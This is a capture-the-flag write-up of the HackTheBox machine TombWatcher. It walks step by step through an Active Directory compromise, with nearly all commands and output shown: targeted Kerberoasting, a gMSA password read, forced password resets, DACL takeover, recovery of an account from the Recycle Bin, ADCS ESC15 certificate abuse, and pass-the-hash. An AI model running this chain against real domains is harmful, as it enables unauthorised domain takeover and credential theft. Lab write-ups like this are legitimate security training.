---
title: "[EN] - HackTheBox: TombWatcher Write-Up"
date: 2026-01-17 11:07:00 +0700
categories: [HackTheBox, Boxes, Medium, Windows]
tags: [ACLs abuse, gMSA, AD recycle bin, ADCS ESC15, Assume Breach, Pass-the-Certificate, Pass-the-Hash]
description: TombWatcher is a medium-difficulty Windows machine that focuses on Active Directory privilege escalation through a chained abuse of domain object permissions. The attack starts with the provided credentials for the user henry, who possesses WriteSPN rights over the account alfred. This access is leveraged to carry out a targeted Kerberoasting attack, allowing the alfred user’s password to be cracked and yielding control over an account that can add itself to the INFRASTRUCTURE group. Being a member of this group allows you to retrieve the gMSA password for the ansible_dev$ managed service account. This account has the privilege to reset the password for the user sam, which becomes the next pivot point. Through the sam user, WriteOwner permissions over the user john are abused to obtain a GenericAll ACE, enabling a password reset and full access to the john user, who is a member of the Remote Management Users group. This provides an interactive shell and access to the user flag. Privilege escalation to Administrator is then achieved by abusing john user’s GenericAll rights over the ADCS organizational unit. A previously deleted account, cert_admin, is restored using the Active Directory Recycle Bin, its password is reset, and it is leveraged to exploit ESC15 against a misconfigured WebServer certificate template. This ultimately allows the issuance of a certificate for Administrator, resulting in full domain compromise.
image: /assets/img/HTB-Tombwatcher_banner.png
---

As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account : 

| Username | Password      |
| -------- | ------------- |
| henry    | H3nry_987TGV! |

---

## Enumeration

### Open TCP Ports

```shell
┌───[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ nmap -sVC -p- -T4 -oN nmap/TCP_all_services.nmap 10.129.232.167
Nmap scan report for DC01.tombwatcher.htb (10.129.232.167)
Host is up (0.025s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-17 15:55:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2026-01-17T15:38:35
|_Not valid after:  2027-01-17T15:38:35
|_ssl-date: 2026-01-17T15:57:29+00:00; +4h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-17T15:57:28+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2026-01-17T15:38:35
|_Not valid after:  2027-01-17T15:38:35
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2026-01-17T15:38:35
|_Not valid after:  2027-01-17T15:38:35
|_ssl-date: 2026-01-17T15:57:29+00:00; +4h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-17T15:57:28+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2026-01-17T15:38:35
|_Not valid after:  2027-01-17T15:38:35
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49696/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
55805/tcp open  msrpc         Microsoft Windows RPC
55822/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-01-17T15:56:51
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 17 12:57:29 2026 -- 1 IP address (1 host up) scanned in 97.25 seconds
```

The Nmap scan reveals the hostname ``DC01.tombwatcher.htb``, confirming we are dealing with an Active Directory Domain Controller. 
The open port profile is characteristic : **DNS (53)**, **Kerberos (88)**, **LDAP/LDAPS (389, 636, 3268, 3269)**, **SMB (445)**, **WinRM (5985)** and **ADWS (9389)**. 
Port **80** exposes a ``Microsoft IIS 10.0`` web server, though it only serves the default IIS page.

The scan also reports a clock skew of approximately 4 hours between my machine and the target. 
This matters for Kerberos authentication, which requires clocks to be within 5 minutes of each other, something to keep in mind when requesting tickets later.

Both ``DC01.tombwatcher.htb`` and ``tombwatcher.htb`` are added to ``/etc/hosts``.

```shell
┌───[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ echo "10.129.232.167 DC01.tombwatcher.htb tombwatcher.htb" | sudo tee -a /etc/hosts > /dev/null
10.129.232.167 DC01.tombwatcher.htb tombwatcher.htb
```

### Domain Enumeration

Since domain credentials are provided from the start, BloodHound collection can begin immediately using NetExec:

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ nxc ldap DC01.tombwatcher.htb -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' --dns-server 10.129.232.167 --bloodhound -c All
LDAP   10.129.232.167    389    DC01    [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)
LDAP   10.129.232.167    389    DC01    [+] tombwatcher.htb\henry:H3nry_987TGV!
LDAP   10.129.232.167    389    DC01    Resolved collection methods: container, session, trusts, objectprops, rdp, localadmin, acl, psremote, dcom, group
LDAP   10.129.232.167    389    DC01    Done in 0M 3S
LDAP   10.129.232.167    389    DC01    Compressing output into /home/tatsuki/.nxc/logs/DC01_10.129.232.167_2026-01-17_142644_bloodhound.zip
```

After importing the data into BloodHound, ``henry`` is marked as owned and the **Shortest Paths from Owned Principals** query is run to identify viable attack paths.

![](/assets/img/HTB-TombWatcher-bloodhound_attack_path1.png)

Following this attack path leads to ``john``, a member of the ``Remote Management Users`` group, who can authenticate to ``DC01.tombwatcher.htb`` via WinRM.

---

## Initial Access
### Henry -> Alfred

As ``henry``, we have ``WriteSPN`` rights over user ``alfred``, meaning we can write to alfred's ``ServicePrincipalName`` attribute. 
This allows us to perform a targeted Kerberoasting attack by temporarily setting an SPN on alfred's account, request a TGS ticket for that account and attempt to crack it offline.

![](/assets/img/HTB-TombWatcher-bloodhound_henry_dacl.png)

Because of the clock skew noted earlier, the system clock must be synchronized with the target before requesting Kerberos tickets. 
This is handled with ``faketime`` and ``rdate`` :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ sudo timedatectl set-ntp 0 && faketime "$(rdate -n $TARGET -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
```

Next we perform a targeted kerberoasting on alfred using [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast) :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' --request-user 'alfred' -o alfred.krbroast
[*] Starting kerberoast attacks
[*] Attacking user (alfred)
[VERBOSE] SPN added successfully for (Alfred)
[+] Writing hash to file for (Alfred)
[VERBOSE] SPN removed successfully for (Alfred)

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ cat alfred.krbroast
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$39b38547c531f23a451393424180c23a$aaa8e3320b8817819a0c335fe6727842fa1ee5ffb353f0615f465b23c2bbda<SNIP>
```

The tool temporarily adds an SPN to alfred's account, requests the TGS and removes the SPN, all automatically. <br>The resulting hash is saved to ``alfred.krbroast``.

The TGS hash is then cracked with Hashcat:

```shell
PS C:\Users\Tatsuki\Tools\hashcat> .\hashcat.exe -a 0 -m 13100 -O .\hashes\alfred.krbroast .\wordlists\rockyou.txt

<SNIP>

Dictionary cache hit:
* Filename..: .\wordlists\rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921496
* Keyspace..: 14344384

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$39b38547c531f23a451393424180c23a$aaa8e3320b8817819a0c335fe6727842fa1ee5ffb353f0615f465<SNIP>:baskXXXXXX

<SNIP>
```

Alfred's password cracks to ``baskXXXXXX``.

---

### Alfred -> Ansible_dev$

BloodHound shows that ``alfred`` has ``GenericAll`` over the ``Infrastructure`` group, allowing him to add himself to the group.

![](/assets/img/HTB-TombWatcher-bloodhound_alfred_dacl.png)

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ bloodyAD --host 10.129.232.167 -d 'tombwatcher.htb' -u 'alfred' -p 'baskXXXXXX' add groupMember 'Infrastructure' 'alfred'
[+] alfred added to Infrastructure
```

As a member of ``Infrastructure``, ``alfred`` inherits the ``ReadGMSAPassword`` ACL, granting him the ability to read the password of the Group Managed Service Account ``ANSIBLE_DEV$``.

![](/assets/img/HTB-TombWatcher-bloodhound_infrastructure_dacl.png)

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ nxc ldap 10.129.232.167 -u 'alfred' -p 'baskXXXXXX' --gmsa
LDAP    10.129.232.167  389    DC01   [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)
LDAP    10.129.232.167  389    DC01   [+] tombwatcher.htb\alfred:baskXXXXXX
LDAP    10.129.232.167  389    DC01   [*] Getting GMSA Passwords
LDAP    10.129.232.167  389    DC01   Account: ansible_dev$         NTLM: 22d7XXXXXXXXXXXXXXXXXXXXXXXXe4cf     PrincipalsAllowedToReadPassword: Infrastructure
```

The NTLM hash for ``ansible_dev$`` is recovered (`22d7XXXXXXXXXXXXXXXXXXXXXXXXe4cf`).

---

### Ansible_dev$ -> Sam

``ansible_dev$`` has the ``ForceChangePassword`` DACL over user ``sam``, allowing an arbitrary password reset without knowing the current one.

![](/assets/img/HTB-TombWatcher-ansible_dev_dacl.png)

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ bloodyAD --host 10.129.232.167 -d 'tombwatcher.htb' -u 'ansible_dev$' -p ':22d7XXXXXXXXXXXXXXXXXXXXXXXXe4cf' set password 'sam' 'H4ck_tH3_Pl4net!'
[+] Password changed successfully!
```

---

### Sam -> John

sam has ``WriteOwner`` over user ``john``, which allows taking ownership of the john object and subsequently granting full control over it.

![](/assets/img/HTB-TombWatcher-bloodhound_sam_dacl.png)

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ owneredit.py -action write -new-owner 'sam' -target 'john' 'tombwatcher.htb/sam:H4ck_tH3_Pl4net!'
<SNIP>

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```

With ownership of the ``john`` object, ``GenericAll`` (Full Control) is granted to ``sam`` :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ dacledit.py -action 'write' -rights 'FullControl' -principal sam -target 'john' 'tombwatcher.htb/sam:H4ck_tH3_Pl4net!'
<SNIP>

[*] DACL backed up to dacledit-20260118-140016.bak
[*] DACL modified successfully!
```

``GenericAll`` opens up several attack vectors, but for simplicity a password reset is the most straightforward in CTFs :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ bloodyAD --host 10.129.232.167 -d 'tombwatcher.htb' -u 'sam' -p 'H4ck_tH3_Pl4net!' set password 'john' 'H4ck_tH3_Pl4net_4_Th3_S3c0nD_T1me!'
[+] Password changed successfully!
```

Since ``john`` is a member of ``Remote Management Users``, a WinRM session can now be opened directly.

![](/assets/img/HTB-TombWatcher-bloodhound_john_group_membership.png)

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ evil-winrm -i 10.129.232.167 -u 'john' -p 'H4ck_tH3_Pl4net_4_Th3_S3c0nD_T1me!'

<SNIP>

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> whoami
tombwatcher\john
*Evil-WinRM* PS C:\Users\john\Documents> cat ..\Desktop\user.txt
1f25XXXXXXXXXXXXXXXXXXXXXXXXbcde
```

---

## Privilege Escalation

### John -> Cert_admin

With ``john``, BloodHound reveals ``GenericAll`` over the ``ADCS`` OU, but the OU appears empty.

![](/assets/img/HTB-TombWatcher-john_dacl_over_adcs.png)

Given the machine name and the presence of a CA, it is reasonable to assume the OU previously held certificate related objects.
If the Active Directory Recycle Bin is enabled and ``john`` holds sufficient privileges, those deleted objects may still be recoverable. 
<br><br>
Querying the Recycle Bin confirms the presence of multiple ``cert_admin`` entries :

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ bloodyAD --host 'DC01.tombwatcher.htb' -u 'john' -d 'tombwatcher.htb' -p 'H4ck_tH3_Pl4net_4_Th3_S3c0nD_T1me!' get search -c 1.2.840.113556.1.4.2064 --filter '(isDeleted=TRUE)' --attr name,sAMAccountName,objectSid

<SNIP>

distinguishedName: CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
name: cert_admin
DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid: S-1-5-21-1392491010-1358638721-2126982587-1109
sAMAccountName: cert_admin

distinguishedName: CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
name: cert_admin
DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid: S-1-5-21-1392491010-1358638721-2126982587-1110
sAMAccountName: cert_admin

distinguishedName: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
name: cert_admin
DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid: S-1-5-21-1392491010-1358638721-2126982587-1111
sAMAccountName: cert_admin

<SNIP>
```

Before restoring the object, it is worth confirming that ``john`` actually holds the necessary restoration rights. 
Checking the ``nTSecurityDescriptor`` of the deleted ``cert_admin`` entry shows that ``john`` is granted ``GENERIC_ALL`` :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ bloodyAD --host 10.129.232.167 -d 'tombwatcher.htb' -u 'john' -p 'H4ck_tH3_Pl4net_4_Th3_S3c0nD_T1me!' get search -c 1.2.840.113556.1.4.2064 --filter '(&(isDeleted=TRUE)(sAMAccountName=cert_admin))' --attr ntsecuritydescriptor --resolve-sd

distinguishedName: CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
nTSecurityDescriptor.Owner: Domain Admins

<SNIP>

nTSecurityDescriptor.ACL.11.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.11.Trustee: Enterprise Admins; john
nTSecurityDescriptor.ACL.11.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.11.ObjectType: Self
nTSecurityDescriptor.ACL.11.Flags: CONTAINER_INHERIT; INHERITED
```

With rights confirmed, the ``cert_admin`` object is restored using its SID :

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ bloodyAD --host 10.129.232.167 -u 'john' -d 'tombwatcher.htb' -p 'H4ck_tH3_Pl4net_4_Th3_S3c0nD_T1me!' set restore 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[+] S-1-5-21-1392491010-1358638721-2126982587-1111 has been restored successfully under CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
```

After refreshing our BloodHound data, the object appears back in the ``ADCS`` OU :

![](/assets/img/HTB-TombWatcher-ADCS-ou-objects.png)

Re-checking john's ACLs also reveals that he holds ``GenericAll`` directly over the restored ``cert_admin`` account, which can be abused in several ways (targeted Kerberoasting, shadow credentials, or simply a password reset) :

![](/assets/img/HTB-TombWatcher-john_dacl.png)

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ bloodyAD --host 10.129.232.167 -d 'tombwatcher.htb' -u 'john' -p 'H4ck_tH3_Pl4net_4_Th3_S3c0nD_T1me!' set password 'cert_admin' 'N0t_H4ckingtH3_Pl4net4nyMore!'
[+] Password changed successfully!
```

### Cert_admin -> DA
#### ADCS ESC15 Escalation

Running Certipy as ``cert_admin`` reveals a vulnerable certificate template :

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ certipy find -u 'cert_admin' -p 'N0t_H4ckingtH3_Pl4net4nyMore!' -dc-ip 10.129.232.167 -vulnerable -stdout
<SNIP>

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:

<SNIP>

    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

The ``WebServer`` template is flagged as vulnerable to **ESC15** (``CVE-2024-49019``). 
It allows the enrollee to supply the subject and uses schema version 1, which means application policies can be injected at enrollment time. 
``cert_admin`` has enrollment rights over this template, making exploitation straightforward.

Two attack scenarios are possible with ESC15 :

- **Direct Impersonation via Schannel** : injecting the "**Client Authentication**" Application Policy
- **PKINIT/Kerberos Impersonation via Enrollment Agent Abuse** : injecting the "**Certificate Request Agent**" Application Policy

The second scenario is more useful here, as it allows impersonating a privileged user through Kerberos.

First, a certificate is requested from the vulnerable V1 template, injecting the "**Certificate Request Agent**" OID (``1.3.6.1.4.1.311.20.2.1``) as an application policy. 
On an unpatched CA, this effectively turns the resulting certificate into an enrollment agent certificate :

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ certipy req -u 'cert_admin@tombwatcher.htb' \
	-p 'N0t_H4ckingtH3_Pl4net4nyMore!' -dc-ip 10.129.232.167 \
	-target 'DC01.TOMBWATCHER.HTB' -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -application-policies '1.3.6.1.4.1.311.20.2.1'
    
<SNIP>

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'
```

The resulting ``cert_admin.pfx`` now acts as an enrollment agent certificate. It is then used to request a certificate on behalf of the ``administrator`` account, this time against the ``User`` template :

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ certipy req -u 'cert_admin@tombwatcher.htb' \
	-p 'N0t_H4ckingtH3_Pl4net4nyMore!' -dc-ip 10.129.232.167 \
	-target 'DC01.TOMBWATCHER.HTB' -ca 'tombwatcher-CA-1' -template 'User' \
    -on-behalf-of 'TOMBWATCHER\administrator' -pfx cert_admin.pfx

<SNIP>

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

The resulting ``administrator.pfx`` contains a certificate with the UPN ``administrator@tombwatcher.htb``. 
Using this certificate, we performed a Pass-the-Certificate attack to authenticate to the DC and retrieve the NTLM hash of the domain administrator.

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ sudo timedatectl set-ntp 0 && faketime "$(rdate -n $TARGET -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh

┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ certipy auth -dc-ip 10.129.232.167 -pfx administrator.pfx
<SNIP>

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61dXXXXXXXXXXXXXXXXXXXXXXXfe5fc
```

As we can see above, Certipy uses the certificate to obtain a TGT via PKINIT and then performs a PKINIT based hash recovery (U2U Kerberos exchange), retrieving the administrator's NT hash (``f61dXXXXXXXXXXXXXXXXXXXXXXXfe5fc``).

With the NT hash in hand, we performed a Pass-the-Hash attack and authenticate on DC01 trough WinRM :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/TombWatcher]
└──╼ [★]$ evil-winrm -i 10.129.232.167 -u 'administrator' -H 'f61dXXXXXXXXXXXXXXXXXXXXXXXfe5fc'

<SNIP>

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
tombwatcher\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
fb58aXXXXXXXXXXXXXXXXXXXXXXX7713
```